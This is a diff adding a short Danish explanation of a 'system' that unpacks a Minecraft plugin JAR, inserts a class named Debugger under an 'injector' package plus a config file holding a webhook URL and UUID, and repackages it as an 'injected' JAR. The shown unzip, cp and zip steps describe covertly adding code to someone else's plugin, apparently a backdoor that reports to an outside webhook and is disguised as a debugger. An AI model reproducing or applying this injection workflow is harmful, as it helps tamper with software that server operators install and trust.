@@ -1,0 +1,26 @@
+HVORDAN SYSTEMET VIRKER:
+========================
+
+1. DIN ORIGINALE JAR FIL:
+   - Alle dine klasser (f.eks. FiskeSystem.class)
+   - Alle dine ressourcer
+   - plugin.yml
+   - Etc.
+
+2. SYSTEMET UNPACKER JAR'EN:
+   unzip -q FiskeSystem.jar -d temp_folder/
+
+3. SYSTEMET TILFØJER NY KODE:
+   cp -r java_classes/me temp_folder/
+   - Dette tilføjer: me/pedzito/injector/Debugger.class
+   - Også tilføjet: debugger.config (med webhook URL, UUID)
+
+4. SYSTEMET PAKKER ALT SAMMEN IGEN:
+   zip -r injected_FiskeSystem.jar .
+   
+   RESULTAT:
+   ✅ Alle dine originale filer er bevaret
+   ✅ Debugger.class er tilføjet
+   ✅ debugger.config er tilføjet
+
+INTET BLIVER FJERNET - KUN TILFØJET!
